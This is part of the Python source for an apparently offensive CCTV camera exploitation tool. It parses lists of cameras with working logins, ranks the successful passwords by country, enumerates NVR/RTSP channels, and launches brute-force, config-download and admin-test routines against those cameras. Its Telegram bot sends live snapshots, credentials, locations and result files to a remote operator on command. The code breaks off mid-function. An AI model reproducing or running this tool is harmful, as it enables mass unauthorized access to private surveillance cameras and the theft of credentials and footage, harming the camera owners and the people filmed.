def parse_selection(selection_str: str, max_val: int) -> List[int]:
    """Parse selection string like '1,2,6-8,10' into list of indices"""
    indices = []
    try:
        parts = [p.strip() for p in selection_str.split(',') if p.strip()]
        for part in parts:
            if '-' in part:
                start, end = map(int, part.split('-'))
                indices.extend(range(start, end + 1))
            else:
                indices.append(int(part))
    except Exception:
        pass
    # Filter valid indices (1-based from user input, converted to 0-based index or matched against dict keys)
    return [i for i in indices if 0 <= i <= max_val]

def remove_duplicates_from_cctv_found():
    """
    Find all _CCTV_Found.txt files and remove duplicate IP sections.
    """
    print(f"{Fore.CYAN}[*] Deduplicating all CCTV_Found files...{Style.RESET_ALL}")
    cctv_files = find_cctv_files()
    for file_path in cctv_files:
        try:
            if not os.path.exists(file_path):
                continue
            
            # Print status for each file to match ValidCamera behavior
            file_name = os.path.basename(file_path)
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Split by the separator used in the file
            separator = '=' * 60
            sections = content.split(separator)
            
            unique_sections = []
            seen_ips = set()
            
            original_count = 0
            for section in sections:
                if not section.strip():
                    continue
                original_count += 1
                
                # Extract IP Address from the section
                ip = None
                for line in section.split('\n'):
                    if 'IP Address:' in line:
                        ip = line.split('IP Address:')[1].strip()
                        break
                
                if ip:
                    if ip not in seen_ips:
                        seen_ips.add(ip)
                        unique_sections.append(section)
                else:
                    # If no IP found (header/footer), keep it
                    unique_sections.append(section)
            
            if len(unique_sections) < original_count:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(separator.join(unique_sections))
                print(f"{Fore.GREEN}[✓] Removed {original_count - len(unique_sections)} duplicates from {file_name}{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}[i]{Style.RESET_ALL} No duplicates found in {file_name}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error deduplicating {file_path}: {e}{Style.RESET_ALL}")

_telegram_listener_running = False

def telegram_bot_listener():
    """
    Background thread: polls Telegram for bot commands and responds.
    Supports /list, /get <filename>, /status, /help
    """
    global _telegram_listener_running
    bot_token = TELEGRAM_CONFIG.get("bot_token")
    chat_id = str(TELEGRAM_CONFIG.get("chat_id", ""))
    if not bot_token or not chat_id:
        return

    base_url = f"https://api.telegram.org/bot{bot_token}"
    last_update_id = 0
    _telegram_listener_running = True

    print(f"[*] Telegram bot listener started — send /help to your bot for commands")

    while _telegram_listener_running:
        try:
            resp = requests.get(
                f"{base_url}/getUpdates",
                params={"offset": last_update_id + 1, "timeout": 30},
                timeout=40
            )
            if resp.status_code != 200:
                time.sleep(5)
                continue

            updates = resp.json().get("result", [])
            for update in updates:
                last_update_id = update["update_id"]
                msg = update.get("message", {}) or update.get("channel_post", {})
                text = (msg.get("text") or "").strip()
                if not text:
                    continue

                # Only respond to our configured chat
                msg_chat_id = str(msg.get("chat", {}).get("id", ""))
                if msg_chat_id != chat_id:
                    continue

                cmd = text.lower()

                if cmd in ("/help", "/start"):
                    reply = (
                        "🤖 <b>Scanner Bot Commands:</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "/list — List all result files\n"
                        "/get &lt;filename&gt; — Download a file\n"
                        "/status — Live scan status\n"
                        "/help — Show this help\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "Example: /get AF_CCTV_Found.txt"
                    )
                    send_telegram_message(reply)

                elif cmd in ("/list", "/files"):
                    result_files = []
                    for fname in sorted(os.listdir(SCRIPT_DIR)):
                        if fname.endswith(".txt") and any(
                            x in fname for x in ["CCTV", "Valid", "Camera"]
                        ):
                            fpath = os.path.join(SCRIPT_DIR, fname)
                            size_kb = os.path.getsize(fpath) // 1024
                            mtime = datetime.fromtimestamp(
                                os.path.getmtime(fpath)
                            ).strftime("%m-%d %H:%M")
                            result_files.append(f"📄 {fname} ({size_kb}KB) [{mtime}]")
                    if result_files:
                        reply = "📂 <b>Available Files:</b>\n" + "\n".join(result_files)
                        reply += "\n\nSend /get &lt;filename&gt; to download"
                    else:
                        reply = "📭 No result files found yet."
                    send_telegram_message(reply)

                elif cmd.startswith("/get "):
                    filename = text[5:].strip()
                    filepath = os.path.join(SCRIPT_DIR, filename)
                    if os.path.exists(filepath):
                        send_telegram_message(f"📤 Sending: <code>{filename}</code>")
                        send_telegram_file_blocking(filepath, f"📤 Retrieved: {filename}")
                    else:
                        # Try case-insensitive match
                        matches = [
                            f for f in os.listdir(SCRIPT_DIR)
                            if f.lower() == filename.lower()
                        ]
                        if matches:
                            fp = os.path.join(SCRIPT_DIR, matches[0])
                            send_telegram_message(f"📤 Sending: <code>{matches[0]}</code>")
                            send_telegram_file_blocking(fp, f"📤 Retrieved: {matches[0]}")
                        else:
                            send_telegram_message(
                                f"❌ File not found: <code>{filename}</code>\n"
                                f"Use /list to see available files."
                            )

                elif cmd == "/status":
                    send_telegram_message(_build_status_message())

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            try:
                print(f"[!] Bot listener error: {e}")
            except Exception:
                pass
            time.sleep(5)


def analyze_valid_camera_files():
    """
    Password Aggregator: read all *ValidCamera.txt files, count which passwords
    succeed most, which countries they hit, and save a ranked report to
    password_analysis.txt.  Also sends a Telegram summary + the report file.
    """
    valid_files = find_valid_camera_files()
    if not valid_files:
        print(f"{Fore.RED}[!] No ValidCamera files found. Run option 2 first.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}{'='*55}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Password Aggregator — analysing {len(valid_files)} file(s){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*55}{Style.RESET_ALL}\n")

    # password → {count, countries: set, ips: list, camera_types: set}
    stats: dict = {}
    total_cameras = 0

    for vf in valid_files:
        try:
            with open(vf, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
        except Exception as e:
            print(f"{Fore.RED}[!] Cannot read {vf}: {e}{Style.RESET_ALL}")
            continue

        # Split on the separator line
        blocks = content.split('=' * 60)
        for block in blocks:
            lines = block.strip().splitlines()
            if not lines:
                continue
            entry = {}
            for line in lines:
                line = line.strip()
                if line.startswith('Password:'):
                    entry['password'] = line.split(':', 1)[1].strip()
                elif line.startswith('Username:'):
                    entry['username'] = line.split(':', 1)[1].strip()
                elif line.startswith('IP Address:'):
                    entry['ip'] = line.split(':', 1)[1].strip()
                elif line.startswith('Port:'):
                    entry['port'] = line.split(':', 1)[1].strip()
                elif line.startswith('Camera Type:'):
                    entry['camera_type'] = line.split(':', 1)[1].strip()
                elif line.startswith('Country:'):
                    entry['country'] = line.split(':', 1)[1].strip()

            pw = entry.get('password', '').strip()
            if not pw or not entry.get('ip'):
                continue

            total_cameras += 1
            if pw not in stats:
                stats[pw] = {
                    'count': 0,
                    'usernames': set(),
                    'countries': set(),
                    'ips': [],
                    'camera_types': set()
                }
            s = stats[pw]
            s['count'] += 1
            if entry.get('username'):
                s['usernames'].add(entry['username'])
            if entry.get('country') and entry['country'].lower() not in ('unknown', ''):
                s['countries'].add(entry['country'])
            ip_port = f"{entry['ip']}:{entry.get('port', '80')}"
            if ip_port not in s['ips']:
                s['ips'].append(ip_port)
            if entry.get('camera_type'):
                s['camera_types'].add(entry['camera_type'])

    if not stats:
        print(f"{Fore.RED}[!] No valid credential entries found in files.{Style.RESET_ALL}")
        return

    # Sort by count descending
    ranked = sorted(stats.items(), key=lambda x: x[1]['count'], reverse=True)

    # ── Console output ─────────────────────────────────────────────────────
    print(f"{Fore.GREEN}[✓] Total successful logins analysed: {total_cameras}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Unique successful passwords:      {len(ranked)}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}{'Rank':<6} {'Password':<30} {'Hits':>5}  Countries{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*70}{Style.RESET_ALL}")
    for rank, (pw, s) in enumerate(ranked[:30], 1):
        countries_str = ', '.join(sorted(s['countries'])) or 'Unknown'
        print(f"  {rank:<4} {pw:<30} {s['count']:>5}  {countries_str}")

    # ── Write report file ──────────────────────────────────────────────────
    report_path = os.path.join(SCRIPT_DIR, "password_analysis.txt")
    try:
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("PASSWORD SUCCESS ANALYSIS REPORT\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Source files: {len(valid_files)}\n")
            f.write(f"Total valid camera logins: {total_cameras}\n")
            f.write(f"Unique successful passwords: {len(ranked)}\n")
            f.write("=" * 70 + "\n\n")
            for rank, (pw, s) in enumerate(ranked, 1):
                f.write(f"Rank #{rank}\n")
                f.write(f"  Password      : {pw}\n")
                f.write(f"  Successful    : {s['count']} camera(s)\n")
                f.write(f"  Usernames     : {', '.join(sorted(s['usernames']))}\n")
                f.write(f"  Camera Types  : {', '.join(sorted(s['camera_types']))}\n")
                countries_str = ', '.join(sorted(s['countries'])) or 'Unknown'
                f.write(f"  Countries     : {countries_str}\n")
                f.write(f"  IP:PORT sample: {', '.join(s['ips'][:10])}\n")
                f.write("-" * 70 + "\n")
        print(f"\n{Fore.GREEN}[✓] Report saved to: {report_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error writing report: {e}{Style.RESET_ALL}")
        return

    # ── Telegram delivery ──────────────────────────────────────────────────
    if TELEGRAM_CONFIG.get("enabled"):
        top_entries = ranked[:10]
        tg_msg = f"📊 <b>Password Analysis Report</b>\n"
        tg_msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
        tg_msg += f"Files analysed: {len(valid_files)}\n"
        tg_msg += f"Total valid logins: {total_cameras}\n"
        tg_msg += f"Unique passwords: {len(ranked)}\n"
        tg_msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
        tg_msg += f"<b>Top 10 Passwords:</b>\n"
        for rank, (pw, s) in enumerate(top_entries, 1):
            countries_str = ', '.join(sorted(s['countries'])) or 'Unknown'
            tg_msg += f"{rank}. <code>{pw}</code> — {s['count']} hits\n   Countries: {countries_str}\n"
        send_telegram_message(tg_msg)
        send_telegram_file(report_path, "📊 Full Password Analysis Report")


def _parse_nvr_entries(valid_file_path):
    """Parse a ValidCamera file and return list of NVR/DVR-type device dicts."""
    _nvr_types = {'nvr', 'dvr', 'xmeye', 'onvif', 'hik', 'dahua',
                  'uniview', 'anjhua', 'reolink', 'axis', 'amcrest', 'tiandy',
                  'foscam', 'camera'}
    entries = []
    try:
        with open(valid_file_path, 'r', encoding='utf-8', errors='replace') as _f:
            content = _f.read()
        for block in content.split('=' * 60):
            if not block.strip():
                continue
            entry = {}
            for line in block.strip().splitlines():
                line = line.strip()
                if line.startswith('Camera Type:'):
                    entry['camera_type'] = line.split(':', 1)[1].strip()
                elif line.startswith('IP Address:'):
                    entry['ip'] = line.split(':', 1)[1].strip()
                elif line.startswith('Port:'):
                    try:
                        entry['port'] = int(line.split(':', 1)[1].strip())
                    except ValueError:
                        entry['port'] = 80
                elif line.startswith('Username:'):
                    entry['username'] = line.split(':', 1)[1].strip()
                elif line.startswith('Password:'):
                    entry['password'] = line.split(':', 1)[1].strip()
            if (entry.get('ip') and entry.get('username') and entry.get('password') and
                    any(t in entry.get('camera_type', '').lower() for t in _nvr_types)):
                entry.setdefault('port', 80)
                entries.append(entry)
    except Exception:
        pass
    return entries


def run_rtsp_file_scan(input_files=None):
    """
    Scan ValidCamera files and run full NVR Channel Split on each camera.
    Organizes output into RTSP_Results/<CC>/ country folders (CC from real geo).
    Filenames include Country, Region, IP, Port for easy identification.
    Supports resume (carries forward previous found count), per-country stats, Telegram.
    """
    import re as _re_rfs
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED

    # ── Collect ValidCamera files ONLY (not CCTV Found — those have no confirmed creds) ──
    if input_files is None:
        all_files = find_valid_camera_files()
    else:
        all_files = [f for f in input_files if 'ValidCamera' in os.path.basename(f)]

    if not all_files:
        print(f"\n{R}[!] No ValidCamera files found.{W}")
        print(f"{Y}    Run a scan (Option 1/3) then a Login Check (Option 2) first{W}")
        print(f"{Y}    to create validated camera files with confirmed credentials.{W}")
        return

    print(f"\n{C}{'═'*65}{W}")
    print(f"{G}  RTSP Channel Scanner — Full NVR/DVR Channel Split{W}")
    print(f"{C}{'═'*65}{W}")
    print(f"{Y}  Reads ValidCamera files, runs full NVR channel enumeration{W}")
    print(f"{Y}  on every camera, saves TXT + JSON + M3U per device into{W}")
    print(f"{Y}  RTSP_Results/<country>/ folders with geo-tagged filenames.{W}")
    print(f"{C}{'═'*65}{W}\n")

    for i, fp in enumerate(all_files, 1):
        try:
            sz = os.path.getsize(fp) / 1024
            print(f"{Y}  {i:>2}.{W} {os.path.basename(fp)}  ({sz:.1f} KB)")
        except Exception:
            print(f"{Y}  {i:>2}.{W} {os.path.basename(fp)}")
    print(f"{Y}   0.{W} All files")
    print(f"{Y}   b.{W} Back to menu")
    print()

    try:
        sel = input(f"{G}Select file(s) — number(s) comma-separated, 0=all, b=back: {W}").strip()
    except (EOFError, KeyboardInterrupt):
        return

    if sel.lower() in ('b', 'back', ''):
        return

    if sel == '0' or sel.lower() == 'all':
        selected = all_files
    else:
        selected = []
        _seen_idx = set()
        for part in sel.replace(',', ' ').split():
            part = part.strip()
            if not part:
                continue
            # Range syntax: e.g. 2-10 or 3-7
            if '-' in part:
                _rng = part.split('-', 1)
                try:
                    _lo = int(_rng[0]) - 1
                    _hi = int(_rng[1]) - 1
                    for _ri in range(min(_lo, _hi), max(_lo, _hi) + 1):
                        if 0 <= _ri < len(all_files) and _ri not in _seen_idx:
                            selected.append(all_files[_ri])
                            _seen_idx.add(_ri)
                        elif _ri >= len(all_files):
                            print(f"{R}[!] No file #{_ri + 1}{W}")
                except ValueError:
                    print(f"{R}[!] Invalid range: {part}{W}")
            else:
                try:
                    idx = int(part) - 1
                    if 0 <= idx < len(all_files) and idx not in _seen_idx:
                        selected.append(all_files[idx])
                        _seen_idx.add(idx)
                    elif idx >= len(all_files):
                        print(f"{R}[!] No file #{idx + 1}{W}")
                except ValueError:
                    print(f"{R}[!] Invalid selection: {part}{W}")
    if not selected:
        print(f"{R}[!] No valid files selected.{W}")
        return

    # ── Parse all camera entries from selected ValidCamera files ──────────────
    all_entries = []
    seen_ips = set()
    for fp in selected:
        try:
            with open(fp, 'r', encoding='utf-8', errors='replace') as fh:
                content = fh.read()
            for block in content.split('=' * 60):
                if not block.strip():
                    continue
                entry = {'source_file': fp}
                for line in block.strip().splitlines():
                    line = line.strip()
                    if line.startswith('Camera Type:'):
                        entry['camera_type'] = line.split(':', 1)[1].strip()
                    elif line.startswith('IP Address:'):
                        entry['ip'] = line.split(':', 1)[1].strip()
                    elif line.startswith('Port:'):
                        try:
                            entry['port'] = int(line.split(':', 1)[1].strip())
                        except ValueError:
                            entry['port'] = 80
                    elif line.startswith('Username:'):
                        entry['username'] = line.split(':', 1)[1].strip()
                    elif line.startswith('Password:'):
                        entry['password'] = line.split(':', 1)[1].strip()
                if (entry.get('ip') and entry.get('username') and entry.get('password')
                        and entry['ip'] not in seen_ips):
                    entry.setdefault('port', 80)
                    entry.setdefault('camera_type', 'Camera')
                    all_entries.append(entry)
                    seen_ips.add(entry['ip'])
        except Exception as e:
            print(f"{R}[!] Could not read {os.path.basename(fp)}: {e}{W}")

    if not all_entries:
        print(f"{R}[!] No camera entries with credentials found.{W}")
        return

    total = len(all_entries)
    print(f"\n{G}[✓] Found {total} unique camera(s) with credentials across {len(selected)} file(s).{W}")

    # ── Resume check — carries forward previous found count ───────────────────
    start_idx   = 0
    found_total = 0
    prog = load_rtsp_scan_progress()
    saved_files   = [os.path.basename(f) for f in prog.get('input_files', [])]
    current_files = [os.path.basename(f) for f in selected]
    if prog and sorted(saved_files) == sorted(current_files):
        prev_idx   = prog.get('last_index', 0)
        prev_found = prog.get('found_total', 0)
        prev_ts    = prog.get('timestamp', '')
        try:
            print(f"\n{Y}[?] Interrupted session found: {prev_idx}/{prog.get('total', total)} "
                  f"done, {prev_found} device(s) split so far (saved {prev_ts}).{W}")
            rc = input(f"{G}Resume from last position? (y/n): {W}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            rc = 'n'
        if rc == 'y':
            start_idx   = prev_idx
            found_total = prev_found
            print(f"{G}[✓] Resuming from entry #{start_idx + 1} of {total} "
                  f"(previously split: {found_total}).{W}")
        else:
            clear_rtsp_scan_progress()
    else:
        clear_rtsp_scan_progress()

    # ── Output root folder: RTSP_Results/ ────────────────────────────────────
    _results_root = os.path.join(SCRIPT_DIR, 'RTSP_Results')
    try:
        os.makedirs(_results_root, exist_ok=True)
    except Exception:
        _results_root = SCRIPT_DIR

    # ── Stats counters per geo-resolved country code ──────────────────────────
    cc_found   = {}
    cc_scanned = {}
    save_every = 10

    def _safe_name(s):
        return _re_rfs.sub(r'[^A-Za-z0-9_\-]', '_', str(s).strip())

    remaining = total - start_idx
    print(f"\n{C}[*] Running NVR Channel Split + Full Auto-Test on {remaining} camera(s)...{W}")
    print(f"{C}    Output: RTSP_Results/<country>/<CC>_<Region>_<IP>_<Port>_<timestamp>.*{W}")
    print(f"{C}    Features: NVR Split · CVE Check · Config Download · RTSP Live · Snapshot{W}\n")

    # ── Start live dashboard (same as Option 2) ───────────────────────────────
    global scanned_count, total_ips, start_time, valid_results
    scanned_count = start_idx
    total_ips     = total
    start_time    = time.time()
    valid_results = []
    start_scan_dashboard(10)

    if TELEGRAM_CONFIG.get("enabled"):
        send_telegram_message(
            f"📡 <b>RTSP Channel Scanner Started</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Cameras: {remaining}\n"
            f"Files: {', '.join(os.path.basename(f) for f in selected)}\n"
            f"Features: NVR Split · CVE · Config · RTSP · Snapshot · QR\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

    _rtsp_last_tg_time = time.time()

    try:
        for idx in range(start_idx, total):
            if _stop_requested.is_set():
                break

            entry = all_entries[idx]
            ip    = entry['ip']
            port  = entry.get('port', 80)
            user  = entry.get('username', '')
            pw    = entry.get('password', '')
            ctype = entry.get('camera_type', 'Camera')

            # ── Inline progress bar (like Option 2) ───────────────────────────
            _rs_elapsed = max(0.01, time.time() - start_time)
            _rs_done    = idx - start_idx
            _rs_spd     = _rs_done / _rs_elapsed if _rs_elapsed > 0 and _rs_done > 0 else 0.01
            _rs_rem_n   = total - idx
            _rs_eta_s   = int(_rs_rem_n / _rs_spd) if _rs_spd > 0 else 0
            _rs_eta     = (f"{_rs_eta_s//3600}h {(_rs_eta_s%3600)//60}m"
                           if _rs_eta_s >= 3600 else
                           f"{_rs_eta_s//60}m {_rs_eta_s%60}s"
                           if _rs_eta_s >= 60 else f"{_rs_eta_s}s")
            _rs_pct     = int(_rs_done * 100 / remaining) if remaining else 0
            _rs_fill    = int(20 * _rs_pct / 100)
            _rs_bar     = '█' * _rs_fill + '░' * (20 - _rs_fill)
            sys.stdout.write(
                f"\r\033[K{C}🔍 [{_rs_bar}] {_rs_pct}% | "
                f"{_rs_done}/{remaining} | "
                f"✅ {found_total} split | "
                f"{_rs_spd:.1f}/s | ETA {_rs_eta}{W}"
            )
            sys.stdout.flush()

            scanned_count = idx

            print(f"\n{C}[{idx+1}/{total}]{W}  {G}{ip}:{port}{W}  {ctype}")

            # ── Geo lookup — determines output folder ─────────────────────────
            geo     = get_geographic_location(ip)
            city    = geo.get('city',    'Unknown')
            region  = geo.get('region',  'Unknown')
            country = geo.get('country', 'Unknown')

            geo_cc = (geo.get('countryCode') or geo.get('country_code') or '').upper()
            if not geo_cc or geo_cc == 'XX':
                for _cd in COUNTRIES.values():
                    if _cd.get('name', '').lower() == country.lower():
                        geo_cc = _cd.get('code', '')
                        break
            if not geo_cc:
                geo_cc = 'XX'

            cc_scanned[geo_cc] = cc_scanned.get(geo_cc, 0) + 1
            print(f"  {Y}Location : {city}, {region}, {country}  [{geo_cc}]{W}")

            # ── Country sub-folder: RTSP_Results/<CC>/ ──────────────────────
            out_dir = os.path.join(_results_root, geo_cc)
            try:
                os.makedirs(out_dir, exist_ok=True)
            except Exception:
                out_dir = _results_root

            fname_prefix = (
                f"{geo_cc}_{_safe_name(region)}_{ip.replace('.','_')}_{port}"
            )

            # ── Full NVR channel split ────────────────────────────────────────
            ch_count, fname_base = run_nvr_split(
                ip, port, user, pw,
                silent=False,
                output_dir=out_dir,
                fname_prefix=fname_prefix
            )

            if ch_count and ch_count > 0:
                found_total += 1
                cc_found[geo_cc] = cc_found.get(geo_cc, 0) + 1
                print(
                    f"  {G}[✓] {ch_count} channel(s) split → "
                    f"RTSP_Results/{geo_cc}/{fname_prefix}_*.{{txt,json,m3u}}{W}"
                )
            else:
                print(f"  {R}[✗] No channels enumerated for {ip}:{port}{W}")

            # ── CVE lookup (immediate result + dashboard increment) ───────────
            try:
                _cves = check_cve(ctype)
                if _cves:
                    _increment_dash('cve', len(_cves))
                    for _cv, _cd_text, _cs in _cves[:3]:
                        _ce = '🚨' if _cs == 'CRITICAL' else '🔴' if _cs == 'HIGH' else '🟡'
                        print(f"  {_ce} {R if _cs=='CRITICAL' else Y}[{_cs}]{W} "
                              f"{C}{_cv}{W} — {_cd_text}")
                else:
                    print(f"  {Y}  No known CVEs for {ctype}{W}")
            except Exception:
                pass

            # ── QR code for web interface ─────────────────────────────────────
            try:
                generate_qr_code(f"http://{ip}:{port}",
                                  f"qr_{ip.replace('.','_')}_{port}_web.png")
            except Exception:
                pass

            # ── Full 11-step auto-test pipeline in background daemon thread ───
            # Runs: RTSP brute · RTSP auth · sub-stream · config download ·
            #       image quality · account enum · admin test · QR · CVE ·
            #       M3U update — all increment dashboard counters automatically
            _launch_auto_test(ip, port, user, pw, ctype)

            # ── Snapshot capture + Telegram photo ────────────────────────────
            if TELEGRAM_CONFIG.get("enabled"):
                try:
                    snapshot = fetch_camera_snapshot(ip, port, user, pw, ctype)
                    if snapshot:
                        snap_caption = (
                            f"📸 RTSP Scan Snapshot\n"
                            f"📷 {ctype}\n"
                            f"🌐 {ip}:{port}\n"
                            f"👤 {user} | 🔑 {pw}\n"
                            f"📍 {city}, {region}, {country}\n"
                            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        )
                        send_telegram_photo(snapshot, snap_caption)
                except Exception:
                    pass

            # ── Telegram 5-minute progress update ────────────────────────────
            _rtsp_now = time.time()
            if TELEGRAM_CONFIG.get("enabled") and (_rtsp_now - _rtsp_last_tg_time >= 300):
                _rtsp_last_tg_time = _rtsp_now
                _rtsp_el   = int(_rtsp_now - start_time)
                _rtsp_el_m = _rtsp_el // 60
                _rtsp_el_s = _rtsp_el % 60
                with _dash_lock:
                    _tg_cve = _dash_cve_count
                    _tg_cfg = _dash_config_count
                    _tg_rsp = _dash_rtsp_count
                tg_prog  = f"⏳ <b>RTSP Scan Progress</b>\n"
                tg_prog += f"━━━━━━━━━━━━━━━━━━━━━━\n"
                tg_prog += f"🔍 Processed: {_rs_done + 1}/{remaining} ({_rs_pct}%)\n"
                tg_prog += f"✅ Devices Split: {found_total}\n"
                tg_prog += f"🔓 CVEs Found: {_tg_cve}\n"
                tg_prog += f"⚙️ Configs Downloaded: {_tg_cfg}\n"
                tg_prog += f"📹 RTSP Live: {_tg_rsp}\n"
                tg_prog += f"🚀 Speed: {_rs_spd:.1f} cam/s\n"
                tg_prog += f"⏱ Elapsed: {_rtsp_el_m}m {_rtsp_el_s}s\n"
                tg_prog += f"🏁 ETA: {_rs_eta}\n"
                tg_prog += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                try:
                    send_telegram_message(tg_prog)
                except Exception:
                    pass

            # ── Save progress every N entries ─────────────────────────────────
            if (idx + 1) % save_every == 0:
                save_rtsp_scan_progress(
                    list(selected), idx + 1, total, found_total
                )
                print(
                    f"{C}  [✎] Progress saved: {idx+1}/{total}  "
                    f"Devices split: {found_total}{W}"
                )
            print()

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Scan interrupted — saving progress...{W}")
        try:
            save_rtsp_scan_progress(list(selected), idx + 1, total, found_total)
            print(f"{Y}    Saved at entry {idx+1}/{total}. Resume next time to continue.{W}")
        except Exception:
            pass
        if TELEGRAM_CONFIG.get("enabled"):
            try:
                with _dash_lock:
                    _tg_cve = _dash_cve_count
                    _tg_cfg = _dash_config_count
                    _tg_rsp = _dash_rtsp_count
                stop_msg  = f"⚠️ <b>RTSP Scan Stopped (Ctrl+C)</b>\n"
                stop_msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
                try:
                    stop_msg += f"🔍 Processed: {idx - start_idx + 1}/{remaining}\n"
                except Exception:
                    pass
                stop_msg += f"✅ Devices Split: {found_total}\n"
                stop_msg += f"🔓 CVEs Found: {_tg_cve}\n"
                stop_msg += f"⚙️ Configs: {_tg_cfg}\n"
                stop_msg += f"📹 RTSP Live: {_tg_rsp}\n"
                stop_msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                send_telegram_message_blocking(stop_msg)
            except Exception:
                pass

    stop_scan_dashboard()

    # ── Update per-country stats ──────────────────────────────────────────────
    for geo_cc, scanned in cc_scanned.items():
        cn = geo_cc
        for _cd in COUNTRIES.values():
            if _cd.get('code', '') == geo_cc:
                cn = _cd.get('name', geo_cc)
                break
        update_rtsp_stats(geo_cc, cn, cc_found.get(geo_cc, 0), scanned)

    # ── Collect final dashboard counters ─────────────────────────────────────
    with _dash_lock:
        _final_cve = _dash_cve_count
        _final_cfg = _dash_config_count
        _final_rsp = _dash_rtsp_count

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{C}{'═'*65}{W}")
    print(f"{G}  RTSP Channel Scan Complete{W}")
    print(f"  Cameras processed     : {total - start_idx}")
    print(f"  Devices with channels : {found_total}")
    print(f"  CVEs found            : {_final_cve}")
    print(f"  Configs downloaded    : {_final_cfg}")
    print(f"  RTSP streams live     : {_final_rsp}")
    print(f"  Results folder        : RTSP_Results/")
    print(f"{C}{'═'*65}{W}")

    if cc_found:
        print(f"\n{Y}  Per-country results:{W}")
        for geo_cc, n in sorted(cc_found.items(), key=lambda x: -x[1]):
            cn = geo_cc
            for _cd in COUNTRIES.values():
                if _cd.get('code', '') == geo_cc:
                    cn = _cd.get('name', geo_cc)
                    break
            folder = os.path.join(_results_root, geo_cc)
            print(f"    {geo_cc} ({cn}): {n} device(s)  →  {folder}/")

    if TELEGRAM_CONFIG.get("enabled"):
        send_telegram_message(
            f"✅ <b>RTSP Channel Scan Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Cameras processed: {total - start_idx}\n"
            f"Devices with channels: {found_total}\n"
            f"🔓 CVEs found: {_final_cve}\n"
            f"⚙️ Configs downloaded: {_final_cfg}\n"
            f"📹 RTSP streams live: {_final_rsp}\n"
            f"Countries: {', '.join(sorted(cc_found.keys())) if cc_found else 'N/A'}\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

    clear_rtsp_scan_progress()


def deduplicate_rtsp_files():
    """
    Scan all RTSP_Results/ sub-folders (and the root) for duplicate RTSP/NVR
    channel-map files that represent the same device.

    Two files are considered duplicates when their stem is identical after
    stripping the optional _YYYYMMDD_HHMMSS timestamp suffix that older runs
    appended.  For each duplicate group the newest file (by modification time)
    is kept; all others are deleted.
    """
    import re as _re_dd
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED

    _results_root = os.path.join(SCRIPT_DIR, 'RTSP_Results')
    _TS_SUFFIX = _re_dd.compile(r'_\d{8}_\d{6}$')   # _YYYYMMDD_HHMMSS at end of stem

    print(f"\n{C}{'═'*64}{W}")
    print(f"{G}  RTSP File Deduplicator{W}")
    print(f"{C}{'═'*64}{W}")
    print(f"  Scanning {_results_root} ...\n")

    # Collect every .txt / .json / .m3u under RTSP_Results
    all_files = []
    for dirpath, _dirs, filenames in os.walk(_results_root):
        for fn in filenames:
            if any(fn.endswith(ext) for ext in ('.txt', '.json', '.m3u')):
                all_files.append(os.path.join(dirpath, fn))
    # Also check root for any leftover files
    try:
        for fn in os.listdir(SCRIPT_DIR):
            fp = os.path.join(SCRIPT_DIR, fn)
            if os.path.isfile(fp) and any(fn.endswith(ext) for ext in ('.txt', '.json', '.m3u')):
                if _re_dd.match(r'^(NVR_|[A-Z]{2}_)', fn) and _re_dd.search(r'_\d{1,3}_\d{1,3}_\d{1,3}_\d{1,3}_', fn):
                    all_files.append(fp)
    except Exception:
        pass

    if not all_files:
        print(f"{Y}[*] No RTSP/NVR files found to deduplicate.{W}\n")
        return

    # Group by (folder, canonical_stem_without_ts, extension)
    groups = {}
    for fp in all_files:
        folder = os.path.dirname(fp)
        fn     = os.path.basename(fp)
        stem, ext = os.path.splitext(fn)
        canonical = _TS_SUFFIX.sub('', stem)   # strip _YYYYMMDD_HHMMSS if present
        key = (folder, canonical, ext)
        groups.setdefault(key, []).append(fp)

    # Separate into: groups with duplicates, and lone files still carrying a timestamp
    dup_groups      = {k: v for k, v in groups.items() if len(v) > 1}
    lone_ts_groups  = {
        k: v[0] for k, v in groups.items()
        if len(v) == 1 and _TS_SUFFIX.search(os.path.splitext(os.path.basename(v[0]))[0])
    }

    if not dup_groups and not lone_ts_groups:
        print(f"{G}[✓] No duplicate or timestamped files found — everything is clean.{W}\n")
        return

    to_delete  = []   # (path,) — files to remove
    to_rename  = []   # (old_path, new_path) — files to rename (strip timestamp)

    # ── Duplicate groups: keep newest, schedule rest for deletion then rename keeper ──
    for (folder, canonical, ext), files in sorted(dup_groups.items()):
